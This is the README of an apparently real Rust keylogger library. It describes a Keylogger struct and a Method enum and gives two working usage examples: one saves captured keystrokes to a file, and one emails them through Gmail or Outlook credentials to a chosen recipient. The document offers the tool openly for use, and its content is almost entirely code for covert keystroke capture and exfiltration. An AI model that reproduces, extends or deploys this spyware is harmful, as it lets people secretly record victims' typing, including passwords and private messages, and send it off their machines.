# Keylogger in Rust

## Getting Started
The Rust Keylogger depends on two objecs, the `Keylogger` struct, and the `Method` enum, which is used to define how to handle a buffer; the buffer being the collected keystrokes which are then either sent through email or saved in an arbitrary file.

## Examples
Initializing a keylogger to write the keystrokes into a file
```rust
use std::io::Result;
use keylogger::{
    Keylogger,
    Method
};

fn main() -> Result<()> {
    let mut keylogger = Keylogger::new(
        Method::File {path : "path/to/log.txt"}
    );
    keylogger.start()?;
    Ok(())
}
```

Initializing a keylogger to send the keystrokes through email. Implemented email domains are *gmail.com* and *outlook.com*.
```rust
use std::io::Result;
use keylogger::{
    Keylogger,
    Method
};

fn main() -> Result<()> {
    let mut keylogger = Keylogger::new(
        Method::Email {
                email : "your_email@outlook.com",
             password : "your_outlook_password",
            recipient : "email_to_send_the_keystrokes_to@example.com"
        }
    );
    keylogger.start()?;
    Ok(())
}
```
